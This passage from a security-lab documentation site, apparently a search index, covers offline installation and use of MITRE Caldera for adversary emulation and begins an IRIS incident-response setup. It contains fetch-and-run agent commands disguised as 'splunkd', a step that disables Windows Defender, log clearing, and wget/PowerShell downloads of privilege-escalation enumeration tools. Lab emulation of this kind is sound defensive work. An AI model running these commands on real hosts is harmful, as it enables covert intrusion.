Agent 10.0.0.50 <p></p>"},{"location":"caldera/caldera.html#installing-caldera","title":"Installing Caldera","text":"<p>You can install Caldera in just four commands by following the simplified installation steps. Alternatively, it can be set up and run using a Docker container.</p>"},{"location":"caldera/caldera.html#system-requirements","title":"System Requirements","text":"<p>Caldera is designed to work across various target systems. The key requirements are as follows:</p> <ul> <li>Operating System: Linux or macOS</li> <li>Python: Version 3.8 or newer (with pip3)</li> <li>NodeJS: Version 16 or newer (required for Caldera v5)</li> <li>Browser: A modern option, such as Google Chrome (recommended)</li> <li>Packages: As specified in the requirements file</li> </ul>"},{"location":"caldera/caldera.html#recommended-setup","title":"Recommended Setup","text":"<p>For a development environment and to enable dynamic agent compilation, the following are advised:</p> <ul> <li>GoLang: Version 1.17 or newer (for enhanced agent functionality)</li> <li>Hardware: At least 8GB of RAM and 2 CPUs</li> <li>Packages: As specified in the dev requirements file</li> </ul>"},{"location":"caldera/caldera.html#installing-caldera-offline-ubuntu","title":"Installing Caldera Offline (Ubuntu)","text":"<p>The documentation outlines the steps for installing MITRE Caldera offline on Ubuntu 24.04.</p>"},{"location":"caldera/caldera.html#on-an-internet-connected-machine","title":"On an Internet-Connected Machine","text":"<p>On an internet-connected machine, refresh the package lists from the repositories and create a structured directory for downloading dependencies:</p> <pre><code>sudo apt-get update\nmkdir -p ~/caldera-offline/{vmtools,pip3,chrome,curl,jq,upx,git,nodejs,nodejs/npm,node-modules,magma-dist,go,go-modules}\n</code></pre> <p>Download and install VM tools and its dependencies (this will enable copy and pasting and dynamic resolution). </p> <pre><code>cd ~/vmtools\napt-get download \\\n  libatkmm-1.6-1v5 \\\n  libcairomm-1.0-1v5 \\\n  libglibmm-2.4-1t64 \\\n  libgtkmm-3.0-1t64 \\\n  libmspack0t64 \\\n  libpangomm-1.4-1v5 \\\n  libsigc++-2.0-0v5 \\\n  libxmlsec1t64 \\\n  libxmlsec1t64-openssl \\\n  open-vm-tools \\\n  open-vm-tools-desktop \\\n  zerofree\nsudo dpkg -i *.deb\n</code></pre> <p>After installing VM tools, you may need to reboot the VM if copy and pasting does not work. </p> <p>Download Python3-pip and its dependencies (required to run <code>pip3 download</code>). </p> <pre><code>cd ~/caldera-offline/pip3\napt-get download python3-pip python3-setuptools python3-wheel ca-certificates python3 \\\n    python3-pkg-resources python3-minimal python3.12 libpython3-stdlib \\\n    openssl debconf cdebconf python3-venv python3-tk python3-doc \\\n    libdebian-installer4 libtextwrap1 python3.12-doc blt libtk8.6 tk8.6-blt2.5 python3.12-venv \\\n    libc6 libtcl8.6 libfontconfig1 libx11-6 libxft2 libxss1 libjs-jquery libjs-underscore \\\n    python3-pip-whl python3-setuptools-whl\n</code></pre> <p>Install the packages in the following order. Verify Python3-pip installation. </p> <pre><code>sudo dpkg -i python3-minimal_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i libpython3-stdlib_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i python3_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i *.deb\npip3 --version\n</code></pre> <p>If you encounter the warning related to permission issue, simply run the <code>sudo apt-get download &lt;SNIP&gt;</code> command again to proceed.</p> <pre><code>#Example\nW: Download is performed unsandboxed as root as file '/home/cyber/python3-pip/build-essential_12.9ubuntu3_amd64.deb' couldn't be accessed by user '_apt'. - pkgAcquire::Run (13: Permission denied)\n</code></pre> <p>Download and install chrome (recommended for accessing Caldera web interface). Verify installation. </p> <pre><code>cd ~/caldera-offline/chrome\nwget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\nsudo dpkg -i *.deb\ngoogle-chrome --version\n</code></pre> <p>Download and install curl (required for agent to connect to Caldera server). Verify installation. </p> <pre><code>cd ~/caldera-offline/curl\nsudo apt-get download curl libc6 libcurl4t64 zlib1g\nsudo dpkg -i *.deb\ncurl --help\n</code></pre> <p>Download and install jq (required to view report in JSON format). Verify installation. </p> <pre><code>cd ~/caldera-offline/jq\nsudo apt-get download jq libc6 libjq1\nsudo dpkg -i *.deb\njq --help\n</code></pre> <p>Download upx. </p> <pre><code>cd ~/caldera-offline/upx\nwget https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-amd64_linux.tar.xz\n</code></pre> <p>Download and install Git (required to run <code>git clone</code>). Verify Git installation. </p> <pre><code>cd ~/caldera-offline/git\nsudo apt-get download git git-man liberror-perl\nsudo dpkg -i *.deb\ngit --version\n</code></pre> <p>Download and install Node.js Verify Node.js installation (required to run <code>npm</code> commands).</p> <pre><code>cd ~/caldera-offline/nodejs\nwget https://nodejs.org/dist/v22.13.1/node-v22.13.1-linux-x64.tar.xz\ntar -xvf node-v22.13.1-linux-x64.tar.xz\nsudo mv node-v22.13.1-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\nnpm --version\n</code></pre> <p>Download and install npm v11. Verify npm installation (required to run <code>npm</code> commands). </p> <pre><code>cd ~/caldera-offline/nodejs/npm\nwget https://registry.npmjs.org/npm/-/npm-11.0.0.tgz\ntar -xzf ~/caldera-offline/nodejs/npm/npm-11.0.0.tgz -C ~/caldera-offline/nodejs/npm --strip-components=1\nsudo /usr/local/nodejs/bin/node ~/caldera-offline/nodejs/npm/bin/npm-cli.js install -g npm\nsudo ln -s /usr/local/nodejs/bin/npm /usr/bin/npm\nnpm --version\n</code></pre> <p>Download and install Go. Verify Go installation (required to run <code>go</code> commands).</p> <pre><code>cd ~/caldera-offline/go\nwget https://go.dev/dl/go1.22.11.linux-amd64.tar.gz\nsudo tar -C /usr/local -xzf go1.22.11.linux-amd64.tar.gz\necho \"export PATH=\\$PATH:/usr/local/go/bin\" &gt;&gt; ~/.bashrc\nsource ~/.bashrc\ngo version\n</code></pre> <p>Clone and prepare the Caldera repository's master branch. This process may take some time.</p> <pre><code>cd ~/caldera-offline\ngit clone https://github.com/mitre/caldera.git --recursive --branch master\n</code></pre> <p>Navigate <code>~/caldera-offline/caldera/plugins/atomic/data</code> and clone and prepare Atomic Red Team repository. This process may take some time.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/atomic/data\ngit clone --depth=1 https://github.com/redcanaryco/atomic-red-team.git\n</code></pre> <p>Fetch Golang dependencies for the Sandcat plugin.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/sandcat/gocat\ngo mod tidy &amp;&amp; go mod download\ncp -r ~/go/pkg/mod ~/caldera-offline/go-modules\n</code></pre> <p>Fetch Node.js dependencies for the Magma plugin.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/magma\nnpm install\nnpm run build\ncp -r node_modules ~/caldera-offline/node-modules\ncp -r dist ~/caldera-offline/magma-dist\n</code></pre> <p>Edit <code>caldera-offline/caldera/requirements.txt</code> with the following changes:</p> <pre><code>nano ~/caldera-offline/caldera/requirements.txt\n</code></pre> <pre><code>#Ubuntu 24.04\naiohttp-jinja2==1.5.1\naiohttp==3.10.8\naiohttp_session==2.12.0\naiohttp-security==0.4.0\naiohttp-apispec==3.0.0b2\njinja2==3.1.3\npyyaml==6.0.1\ncryptography==42.0.3 #ref issues\nwebsockets==11.0.3\nSphinx==7.1.2\nsphinx_rtd_theme==1.3.0\nmyst-parser==2.0.0\nmarshmallow==3.20.1\ndirhash==0.2.1\nmarshmallow-enum==1.5.1\nldap3==2.9.1\nlxml~=4.9.1  # debrief\nreportlab==4.0.4  # debrief\nrich==13.7.0\nsvglib==1.5.1  # debrief\nMarkdown==3.4.4  # training\ndnspython==2.4.2\nasyncssh==2.14.1\naioftp~=0.20.0\npackaging==24.2 #ref issues\ncroniter~=3.0.3\npyopenssl #ref issues\ndocker #resolve warning\n</code></pre> <p>Make a directory for Python dependencies and download all dependencies listed in the <code>requirements-dev.txt</code> and <code>requirements.txt</code> into the <code>python_deps</code> folder. </p> <pre><code>mkdir ~/caldera-offline/caldera/python_deps\npip3 download -r ~/caldera-offline/caldera/requirements-dev.txt --dest ~/caldera-offline/caldera/python_deps\npip3 download -r ~/caldera-offline/caldera/requirements.txt --dest ~/caldera-offline/caldera/python_deps\n</code></pre> <p>Compress all dependencies for transfer</p> <pre><code>cd ~/caldera-offline\ntar -czvf caldera-offline.tar.gz *\n</code></pre> <p>Transfer <code>caldera-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p>"},{"location":"caldera/caldera.html#on-the-air-gapped-environment","title":"On the Air-Gapped Environment","text":"<p>On the air-gapped Ubuntu VM, make a directory called caldera-offline and extract the transferred archive.</p> <pre><code>mkdir ~/caldera-offline &amp;&amp; cd ~/caldera-offline\ntar -xzvf ~/caldera-offline.tar.gz\n</code></pre> <p>Install the Python3-pip packages in the following order. Verify Python3-pip installation.</p> <pre><code>cd ~/caldera-offline/pip3\nsudo dpkg -i python3-minimal_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i libpython3-stdlib_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i python3_3.12.3-0ubuntu2_amd64.deb\nsudo dpkg -i *.deb\npip3 --version\n</code></pre> <p>Install Google Chrome and verify installation.</p> <pre><code>cd ~/caldera-offline/chrome\nsudo dpkg -i *.deb\ngoogle-chrome --version\n</code></pre> <p>Install jq and verify installation.</p> <pre><code>cd ~/caldera-offline/jq\nsudo dpkg -i *.deb\njq --help\n</code></pre> <p>Install curl and verify installation.</p> <pre><code>cd ~/caldera-offline/curl\nsudo dpkg -i *.deb\ncurl --help\n</code></pre> <p>Install upx and verify installation.</p> <pre><code>cd ~/caldera-offline/upx\ntar -xvf upx-4.2.4-amd64_linux.tar.xz\nsudo mv upx-4.2.4-amd64_linux/upx /usr/local/bin/\nupx --version\n</code></pre> <p>Install Node.js and verify installation.</p> <pre><code>cd ~/caldera-offline/nodejs\ntar -xvf node-v22.13.1-linux-x64.tar.xz\nsudo mv node-v22.13.1-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\n</code></pre> <p>Install npm v11 and verify installation. This process may take some time.</p> <pre><code>cd ~/caldera-offline/nodejs/npm\ntar -xzf ~/caldera-offline/nodejs/npm/npm-11.0.0.tgz -C ~/caldera-offline/nodejs/npm --strip-components=1\nsudo /usr/local/nodejs/bin/node ~/caldera-offline/nodejs/npm/bin/npm-cli.js install -g --cache ~/caldera-offline/nodejs/npm-cache --no-audit --no-fund\nsudo ln -s /usr/local/nodejs/bin/npm /usr/bin/npm\nnpm --version\n</code></pre> <p>Install Go and verify installation.</p> <pre><code>cd ~/caldera-offline/go\nsudo tar -C /usr/local -xzf go1.22.11.linux-amd64.tar.gz\necho \"export PATH=\\$PATH:/usr/local/go/bin\" &gt;&gt; ~/.bashrc\nsource ~/.bashrc\ngo version\n</code></pre> <p>Restore Golang Dependencies.</p> <pre><code>mkdir -p ~/go/pkg\ncp -r ~/caldera-offline/go-modules/* ~/go/pkg/mod\n</code></pre> <p>Restore Node.js dependencies for the Magma plugin.</p> <pre><code>cd ~/caldera-offline/caldera/plugins/magma\ncp -r ~/caldera-offline/node-modules node_modules\ncp -r ~/caldera-offline/magma-dist dist\n</code></pre> <p>This restores the Node.js dependencies and built Magma frontend, so you don\u2019t need to run <code>npm install</code> or <code>npm run build</code> again.</p> <p>Install all dependencies listed in requirements-dev.txt and requirements.txt.</p> <pre><code>cd ~/caldera-offline/caldera/\npip3 install -r requirements-dev.txt --no-index --find-links=./python_deps --break-system-packages\npip3 install -r requirements.txt --no-index --find-links=./python_deps --break-system-packages\n</code></pre> <p>Resolving Common Issues</p> <p>If you encounter this warning:</p> <pre><code>WARNING: The script safety is installed in '/home/cyber/.local/bin' which is not on PATH.\n</code></pre> <p>Add the directory to your <code>PATH</code>:</p> <pre><code>echo 'export PATH=\"$PATH:/home/cyber/.local/bin\"' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n</code></pre>"},{"location":"caldera/caldera.html#running-caldera","title":"Running Caldera","text":"<p>Navigate to the Caldera directory and launch the server. Wait until you see All systems ready. This process may take some time. </p> <pre><code>cd ~/caldera-offline/caldera\npython3 server.py --build --log DEBUG\n</code></pre> <pre><code>2025-02-01 04:46:20 INFO     Creating new secure config in conf/local.yml                                                                                        config_generator.py:55\n                    INFO                                                                                                                                         config_generator.py:30\n                             Log into Caldera with the following admin credentials:                                                                                                    \n                                 Red:                                                                                                                                                  \n                                     USERNAME: red                                                                                                                                     \n                                     PASSWORD: &lt;SNIP&gt;                                                                                             \n                                     API_TOKEN: &lt;SNIP&gt;\n                                 Blue:                                                                                                                                                 \n                                     USERNAME: blue                                                                                                                                    \n                                     PASSWORD: &lt;SNIP&gt;                                                                                             \n                                     API_TOKEN: &lt;SNIP&gt;                                                                                            \n                             To modify these values, edit the conf/local.yml file.   \n\n&lt;SNIP&gt;\n\n                    INFO     All systems ready.                                                                                                                           server.py:104\n\n \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557\n\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\n\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\n\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\n \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n</code></pre> <p>The login credential for the web UI can be found in <code>~/caldera-offline/caldera/conf/local.yml</code></p> <p>At this stage, the web interface can only be accessed on the local machine hosting Caldera using the URL <code>http://localhost:8888</code>. While we can still open the web interface from another host on the same network using <code>http://&lt;IP address&gt;:8888</code>, the login page will be unresponsive.</p> <p>To resolve this issue, exit Caldera by pressing <code>Ctrl + C</code>.</p> <p>Edit <code>~/caldera-offline/caldera/conf/local.yml</code> with the following details:</p> <pre><code>nano ~/caldera-offline/caldera/conf/local.yml\n</code></pre> <pre><code>app.contact.http: http://SERVER-IP:8888\napp.frontend.api_base_url: http://SERVER-IP:8888\n</code></pre> <p>Edit <code>~/caldera-offline/caldera/plugins/magma/.env</code> with following details:</p> <pre><code>nano ~/caldera-offline/caldera/plugins/magma/.env\n</code></pre> <pre><code>VITE_CALDERA_URL=http://SERVER-IP:8888\n</code></pre> <p>Rebuild Caldera with following parameters. Wait until you see All systems ready. This process may take some time. </p> <pre><code>cd ~/caldera-offline/caldera\npython3 server.py --build --fresh --log DEBUG\n</code></pre> <p>The newly generated login credential for the web UI can be found in <code>~/caldera-offline/caldera/conf/local.yml</code></p> <p>From the Ubuntu VM, verify that you can log in to Caldera's web interface using the Red user\u2019s credentials, with the Caldera VM's IP address as the URL <code>http://&lt;SERVER-IP&gt;:8888</code>. Likewise, verify that you can log in to Caldera's web interface using the Red user\u2019s credentials and the Caldera VM\u2019s IP address from the Caldera VM itself.</p> <p></p> <p></p>"},{"location":"caldera/caldera.html#installing-caldera-online","title":"Installing Caldera Online","text":""},{"location":"caldera/caldera.html#quick-installation","title":"Quick Installation","text":"<p>You can set up Caldera swiftly by running the following four commands in your terminal:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive\ncd caldera\npip3 install -r requirements.txt\npython3 server.py --insecure --build\n</code></pre>"},{"location":"caldera/caldera.html#step-by-step-installation-guide","title":"Step-by-Step Installation Guide","text":"<ol> <li> <p>Clone the Repository:</p> <p>Use a recursive clone to include all plugins. It is recommended to specify a version or release (in <code>x.x.x</code> format). Cloning non-release branches, such as <code>master</code>, may introduce bugs. The basic command is:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive --branch x.x.x\n</code></pre> <p>For example, to clone version 5.0.0:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive --branch 5.0.0\n</code></pre> </li> <li> <p>Navigate to the Directory:</p> <pre><code>cd caldera\n</code></pre> </li> <li> <p>Install Dependencies:</p> <pre><code>sudo pip3 install -r requirements.txt\n</code></pre> </li> <li> <p>Start the Server:</p> <p>Start the server with the <code>--build</code> argument on the first launch or when pulling updates:</p> <pre><code>python3 server.py --build\n</code></pre> <p>After launching, access the interface at <code>http://localhost:8888</code>. Log in with the default username <code>red</code> and the password found in the <code>conf/local.yml</code> file, generated when the server starts.</p> <p>To learn how to use Caldera, visit the Training plugin and complete the capture-the-flag style course.</p> </li> </ol>"},{"location":"caldera/caldera.html#docker-deployment","title":"Docker Deployment","text":"<p>Caldera can also be installed and run using Docker.</p> <ol> <li> <p>Clone the Repository:</p> <p>Clone the repository recursively, specifying the desired version/release:</p> <pre><code>git clone https://github.com/mitre/caldera.git --recursive --branch x.x.x\n</code></pre> </li> <li> <p>Build the Docker Image:</p> <p>Navigate to the repository directory and build the Docker image.</p> <pre><code>cd caldera\ndocker build --build-arg WIN_BUILD=true . -t caldera:server\n</code></pre> <p>Alternatively, use the <code>docker-compose.yml</code> file:</p> <pre><code>docker-compose build\n</code></pre> </li> <li> <p>Run the Docker Container:</p> <p>Start the Caldera server, modifying port forwarding as necessary:</p> <pre><code>docker run -p 7010:7010 -p 7011:7011/udp -p 7012:7012 -p 8888:8888 caldera:server\n</code></pre> </li> <li> <p>Stop the Docker Container:</p> <p>To shut down the container gracefully, first identify the container ID:</p> <pre><code>docker ps\n</code></pre> <p>Then, send an interrupt signal:</p> <pre><code>docker kill --signal=SIGINT [container ID]\n</code></pre> </li> </ol>"},{"location":"caldera/caldera.html#introduction-to-caldera","title":"Introduction to Caldera","text":""},{"location":"caldera/caldera.html#configuring-abilities","title":"Configuring Abilities","text":"<p>Before deploying Caldera agents, we need to edit the abilities we will be using. In the web UI, under Campaigns, navigate to Abilities. Search for Check Python, then click on it.</p> <p></p> <p>Under Executor, enter following details for linux and windows and delete darwin (if it exists). Click Save. </p> Platform linux Executor sh Command python3 \u2014version Platform windows Executor psh Command python3 \u2014version <p></p> <p></p> <p>Search for Check Chrome, then repeat the similar process:</p> Platform windows Executor psh Command which google-chrome Platform linux Executor sh Command which google-chrome <p></p> <p></p> <p>Search for Check Go, then repeat the similar process:</p> Platform windows Executor psh Command which go Platform linux Executor sh Command which go <p></p> <p></p> <p>In the web GUI, under Campaigns, navigate to Agents and click Configuration.</p> <p></p> <p>The default implant name is 'splunkd', but you can change it. For Bootstrap Abilities, add 'Check Python', 'Check Go', and 'Check Chrome'. For Deadman Abilities, add 'Clear Logs'. Click Save.</p> <p></p>"},{"location":"caldera/caldera.html#deploying-linux-agent","title":"Deploying Linux Agent","text":"<p>Click 'Deploy an Agent'. For Agent, select 'Sandcat'. For Platform, select 'Linux'.  Copy and paste the commands into the Linux client.</p> <p>For example:</p> <pre><code>server=\"http://10.0.0.100:8888\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $server/file/download &gt; splunkd;\nchmod +x splunkd;\n./splunkd -server $server -group red -v\n</code></pre> <p></p> <p></p> <p>After running the commands on the Linux client, confirm that the agent is visible and its status is 'Alive' in the Caldera web UI.</p> <p></p>"},{"location":"caldera/caldera.html#deploying-windows-agent","title":"Deploying Windows Agent","text":"<p>Click 'Deploy an Agent'. For Agent, select 'Sandcat'. For Platform, select 'Windows'. On Windows client, disable Windows Defender. Copy and paste the commands into the PowerShell terminal of the Windows client.</p> <p>For example:</p> <pre><code>$server=\"http://10.0.0.100:8888\";\n$url=\"$server/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$data=$wc.DownloadData($url);\nget-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;\nrm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;\nStart-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;\n</code></pre> <p></p> <p></p> <p>After running the commands on the Windows client, confirm that the agent is visible and its status is 'Alive' in the Caldera web UI.</p> <p></p>"},{"location":"caldera/caldera.html#verifying-access-to-agents","title":"Verifying Access to Agents","text":"<p>Under Plugins, navigate to Access and select your Linux and Windows agents. You will see the actions defined in Bootstrap and Deadman Abilities completed on each client, along with their status (success or failed). </p> <p></p> <p></p>"},{"location":"caldera/caldera.html#creating-a-new-adversary-profile","title":"Creating a New Adversary Profile","text":"<p>Under Campaigns, navigate to Adversaries. Click 'New Profile', then edit the Adversary name and description (e.g., 'Red Haast Eagle'; 'This is our kill chain'). Click 'Done'.</p> <p></p> <p>Click Add Ability.</p> <p></p> <p>Search and select Check Python.</p> <p></p> <p>Click Check Python to Edit Ability.</p> <p></p> <p>Verify that executors for Linux and Windows are available, as configured previously.</p> <p>Add the Abilities for \u2018Check Go\u2019 and 'Check Chrome'. Repeat the process as needed. Click Save.</p> <p></p>"},{"location":"caldera/caldera.html#creating-custom-abilities","title":"Creating Custom Abilities","text":"<p>Navigate to abilities and click Create an Ability.</p> <p></p> <p>Put following details:</p> Name Run LinPEAS Description Run LinPEAS to enumerate host for privilege escalation. Tactic discovery Technique ID T1083 Technique Name File and Directory Discovery <p></p> <p>Click Add Executor and put following details and click Create:</p> Platform linux Executor sh Command wget http://10.0.0.100:8000/linpeas.sh -O /dev/shm/linpeas.sh; sh /dev/shm/linpeas.sh Timeout 300 Cleanup rm -rf /dev/shm/linpeas.sh <p></p> <p>Repeat the process for Creating an ability for winPEAS.</p> Name Run WinPEAS Description Run WinPEAS to enumerate host for privilege escalation. Tactic discovery Technique ID T1083 Technique Name File and Directory Discovery <p></p> <p>Add windows executor with following details and click Create:</p> Platform windows Executor psh Command Invoke-WebRequest -Uri \"http://10.0.0.100:8000/winpeas.exe\" -OutFile \"C:\\Windows\\Temp\\winpeas.exe\"; Start-Process -FilePath \"C:\\Windows\\Temp\\winpeas.exe\" -NoNewWindow -Wait Tee-Object -FilePath \"C:\\Windows\\Temp\\notes.txt\" Timeout 300 Cleanup Remove-Item -Path \"C:\\Windows\\Temp\\winpeas.exe\" -Force <p></p>"},{"location":"caldera/caldera.html#downloading-linpeas-and-winpeas","title":"Downloading LinPEAS and WinPEAS","text":"<p>Since we configured our agents to download LinPEAS and WinPEAS from the Caldera VM\u2019s web server (10.0.0.100), we need to download the tools and host them on a web server. On the Caldera VM, connect to the internet and download LinPEAS. Then, modify its permissions to allow execution by running the following commands:</p> <pre><code>cd ~\nwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n</code></pre> <p>Download WinPEAS and output it as <code>winpeas.exe</code>:</p> <pre><code>cd ~\nwget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -O winpeas.exe\n</code></pre> <p>Start a Python web server to serve the downloaded tools:</p> <pre><code>python3 -m http.server\n</code></pre> <p></p>"},{"location":"caldera/caldera.html#adding-custom-abilities","title":"Adding Custom Abilities","text":"<p>Navigate to Adversaries and add the \u2018Run LinPEAS\u2019 and \u2018Run WinPEAS\u2019 abilities to your Adversary profile. Click Save.</p> <p></p>"},{"location":"caldera/caldera.html#creating-an-operation","title":"Creating an Operation","text":"<p>Navigate to Operations and click \u2018New Operation.\u2019</p> <p></p> <p>Name the operation and select your newly created adversary profile. The default setting for obfuscators is plain-text, but other options, such as Base64, are available. Click Start.</p> <p></p> <p>The operation will start and execute the abilities we configured on the Linux and Windows agents. Wait until the operation returns a status for all abilities. This process may take some time. </p> <p></p> <p></p>"},{"location":"caldera/caldera.html#adding-a-manual-command","title":"Adding a Manual Command","text":"<p>To add a manual command, click Manual Command, select the agent, choose the executor, and enter the command. Click Add Cimmand.</p> <p>For example, to view the output of LinPEAS on an Ubuntu agent using sh, enter the following command:</p> <pre><code>cat /dev/shm/linpeas.out\n</code></pre> <p></p> <p></p>"},{"location":"caldera/caldera.html#generating-an-operation-report-json","title":"Generating an Operation Report (JSON)","text":"<p>The \"Run LinPEAS\" and \"Run WinPEAS\" abilities cause an error when generating a full JSON report, as the report contains a null value. For demonstration purposes, an adversary profile named \"Red Haast Eagle v2\" has been created, excluding both abilities. Additionally, a new operation called \"Cyber Defence Kit v2\" has been created and successfully completed using the Red Haast Eagle v2 adversary profile to demonstrate the functionality of downloading an operation report in JSON format. Navigate to operations, select Cyber Defence Kit v2 and click Download Report. </p> <p></p> <p></p> <p>You can include agent output unless it contains sensitive data. Reports can be downloaded in JSON (Full Report), Event Logs, or CSV format. Select Full Report and click Download.</p> <p></p> <p>Use the jq to view to JSON report by running:</p> <pre><code>cat 'Cyber Defence Kit_report.json' | jq . | less\n</code></pre> <p>Search for chrome by running:</p> <pre><code>/chrome\n</code></pre> <p></p> <p></p>"},{"location":"caldera/caldera.html#generating-a-pdf-report","title":"Generating a PDF Report","text":"<p>The debrief plugin provides a centralised view of campaign analytics, operation metadata, visuals, techniques, tactics, and discovered facts. Navigate to Debrief under Plugins and select your newly created operation. Click Download PDF Report.</p> <p></p> <p>Select Report Sections that you want to include, then click Download.</p> <p></p> <p>This generates a well-formatted PDF report.</p> <p></p>"},{"location":"caldera/caldera.html#generating-a-layer-for-mitre-attck-navigator","title":"Generating a Layer for MITRE ATT&amp;CK Navigator","text":"<p>For demonstration purposes, the internet has been connected temporarily to access MITRE ATT&amp;CK Navigator. There is a way to host MITRE ATT&amp;CK Navigator in an air-gapped environment, which will be covered in a separate section later. </p> <p>Click Compass plugin. Select your newly created adversary profile and click Generate Layer. This will automatically download <code>layer.json</code> file. </p> <p></p> <p>Click Open Existing Layer, then select Upload from Local. Choose layer.json and dismiss the warning for an outdated layer.</p> <p></p> <p></p> <p>This highlights the discovery techniques in ATT&amp;CK Navigator used by our newly created adversary profile.</p> <p></p>"},{"location":"caldera/caldera.html#references","title":"References","text":"<ul> <li>https://github.com/mitre/caldera</li> <li>https://caldera.mitre.org/</li> <li>https://caldera.readthedocs.io/en/latest/index.html</li> <li>https://www.youtube.com/watch?v=ZSDhDV48DUs&amp;list=PLA3BVzhXP1c0DwPORcVdjpEukfRmgcsOk</li> <li>https://youtu.be/Z9QdgD8dG24?si=U0mLaJk9a0DSBkWY</li> </ul>"},{"location":"iris/iris.html","title":"IRIS","text":"<p>IRIS is a digital platform built for collaboration among incident response analysts, enabling them to work together on detailed technical investigations. It can be set up on a standalone server or used as a portable application, making it suitable for on-the-go investigations in locations without internet access.</p>"},{"location":"iris/iris.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, an attack simulation was conducted on a Windows Virtual Machine (VM) using Kali Linux in a safe and controlled environment. Both IRIS and Splunk Enterprise were installed on an Ubuntu VM.</p> <p>Note: Do not attempt to replicate the attack simulation demonstrated here unless you are properly trained and it is conducted in a secure and authorised manner. Unauthorised attack simulation can result in legal consequences and unintended damage to systems. Always ensure such activities are performed by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) Iris Ubuntu 22.04 LTS IRIS 10.0.0.50 Splunk Ubuntu 22.04 LTS Splunk Enterprise 10.0.0.120 WS2019 Windows Server 2019 Splunk Universal Forwarder, Domain Controller 10.0.0.140 Kali Kali Linux 2024.2 Attacker machine 10.0.0.29 <p></p>"},{"location":"iris/iris.html#installing-iris-in-an-air-gapped-environment-ubuntu","title":"Installing IRIS in an Air-gapped Environment (Ubuntu)","text":"<p>These instructions cover downloading, transferring, and installing Docker Engine and IRIS in an air-gapped environment for Ubuntu 22.04.4 LTS. </p> <p>Preparing the Folder Structure</p> <p>On an internet-connected machine, create a structured directory</p> <pre><code>mkdir -p ~/iris-offline/{docker,docker-images}\n</code></pre> <p>Navigate to <code>~/iris-offline/docker</code> and download Docker Engine and dependencies.</p> <pre><code>cd ~/iris-offline/docker\nwget https://download.docker.com/linux/ubuntu/dists/jammy/pool/stable/amd64/containerd.io_1.7.25-1_amd64.deb\nwget 